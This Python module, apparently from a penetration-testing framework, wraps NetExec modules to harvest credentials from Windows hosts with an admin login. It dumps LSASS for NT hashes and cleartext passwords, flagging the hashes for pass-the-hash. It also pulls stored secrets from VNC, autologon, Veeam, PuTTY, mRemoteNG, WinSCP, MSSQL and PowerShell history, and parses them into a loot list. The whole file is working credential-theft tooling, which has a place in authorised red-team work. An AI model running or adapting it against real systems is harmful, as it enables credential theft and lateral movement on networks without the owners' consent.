"""Loot that NetExec (nxc) modules do well: VNC, PS history, LSASS, autologon,
eventlog, Veeam, PuTTY, mRemoteNG, WinSCP, MSSQL. Run once per host with an admin
credential. Tolerant line parsing; raw output always saved."""
from __future__ import annotations

import re
from typing import List

from core.credential import Credential
from core.secret import Secret, Status
from core.tools import find_tool, run, strip_ansi
from .base import BaseCollector

NXC_LINE = re.compile(r"^\s*\S+\s+\S+\s+\d+\s+\S+\s+(.*)$")


class _NxcModule(BaseCollector):
    per_credential = False
    needs_admin = True        # these read the target's registry/files (admin)
    requires = ("nxc",)
    module = ""
    source = ""
    proto = "smb"

    def collect_once(self, cred: Credential) -> List[Secret]:
        bin_ = find_tool("nxc")
        if not bin_:
            return []
        cmd = [bin_, self.proto, self.host] + cred.nxc_auth_args() + ["-M", self.module]
        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                  raw_name=self._raw_name(cred))
        return self._parse(res.output)

    def _messages(self, out: str) -> List[str]:
        msgs = []
        for line in strip_ansi(out).splitlines():
            m = NXC_LINE.match(line)
            if m:
                msgs.append(m.group(1).strip())
        return msgs

    def _parse(self, out: str) -> List[Secret]:
        return []


class VncCollector(_NxcModule):
    name = "VNC"; source = "VNC"; module = "vnc"
    description = "VNC passwords from registry/config"

    def _parse(self, out: str) -> List[Secret]:
        found = []
        for msg in self._messages(out):
            m = re.search(r"(?:password|found)[:\s]+(\S+)", msg, re.I)
            if m and self.module in out.lower():
                found.append(Secret(self.host, "VNC", "", m.group(1),
                                    Status.CLEARTEXT, secret_type="password"))
        return found


class PSHistoryCollector(_NxcModule):
    name = "PSHistory"; source = "PSHistory"; module = "powershell_history"
    description = "PowerShell console history (hunts for inline secrets)"

    SECRET_HINT = re.compile(r"(pass|pwd|secret|cred|-AsPlainText|ConvertTo-SecureString|"
                             r"net user|token|apikey)", re.I)

    def _parse(self, out: str) -> List[Secret]:
        found = []
        for msg in self._messages(out):
            if self.SECRET_HINT.search(msg):
                found.append(Secret(self.host, "PSHistory", "", msg[:160],
                                    Status.INFO, secret_type="history-line",
                                    notes="review raw file"))
        return found


class LsassCollector(_NxcModule):
    name = "LSASS"; source = "LSASS"; module = "lsassy"
    description = "Live LSASS dump (logged-on users' hashes/cleartext)"

    LINE = re.compile(r"^([^\s\\/]+[\\/][^\s]+)\s+([0-9a-fA-F]{32}|\S+)$")

    def _parse(self, out: str) -> List[Secret]:
        found = []
        for msg in self._messages(out):
            m = self.LINE.match(msg.strip())
            if not m:
                continue
            user, sec = m.group(1), m.group(2)
            if re.fullmatch(r"[0-9a-fA-F]{32}", sec):
                found.append(Secret(self.host, "LSASS", user, sec, Status.HASH,
                                    secret_type="nthash", notes="from LSASS; PtH"))
            else:
                found.append(Secret(self.host, "LSASS", user, sec, Status.CLEARTEXT,
                                    secret_type="password", notes="cleartext from LSASS"))
        return found


class _UserPassNxc(_NxcModule):
    """Shared parser for modules that print a user + password pair somewhere."""
    def _parse(self, out: str) -> List[Secret]:
        found = []
        user = None
        for msg in self._messages(out):
            mu = re.search(r"(?:user(?:name)?|account|login)[\s:=]+([^\s]+)", msg, re.I)
            mp = re.search(r"(?:password|pass|pwd|secret)[\s:=]+([^\s]+)", msg, re.I)
            if mu and not mp:
                user = mu.group(1)
            if mp:
                found.append(Secret(self.host, self.source, (mu.group(1) if mu else user) or "",
                                    mp.group(1), Status.CLEARTEXT, secret_type="password",
                                    notes=self.source))
                user = None
        return found


class AutologonCollector(_UserPassNxc):
    name = "Autologon"; source = "Autologon"; module = "gpp_autologin"
    description = "Registry/GPP autologon credentials (Winlogon)"


class EventlogCollector(_UserPassNxc):
    name = "EventLog"; source = "EventLog"; module = "eventlog_creds"
    description = "Credentials in Security event log (4688 command lines)"


class VeeamCollector(_UserPassNxc):
    name = "Veeam"; source = "Veeam"; module = "veeam"
    description = "Veeam Backup stored credentials"


class PuttyCollector(_UserPassNxc):
    name = "PuTTY"; source = "PuTTY"; module = "putty"
    description = "PuTTY stored sessions / proxy credentials"


class MremotengCollector(_UserPassNxc):
    name = "mRemoteNG"; source = "mRemoteNG"; module = "mremoteng"
    description = "mRemoteNG saved connection credentials"


class WinscpCollector(_UserPassNxc):
    name = "WinSCP"; source = "WinSCP"; module = "winscp"
    description = "WinSCP saved session credentials"


class MssqlCollector(_UserPassNxc):
    name = "MSSQL"; source = "MSSQL"; module = "mssql_priv"
    proto = "mssql"
    needs_admin = False       # SQL login, not local admin
    needs_mssql = True        # auto-skip unless 1433 is open
    description = "MSSQL access / privilege + stored logins"
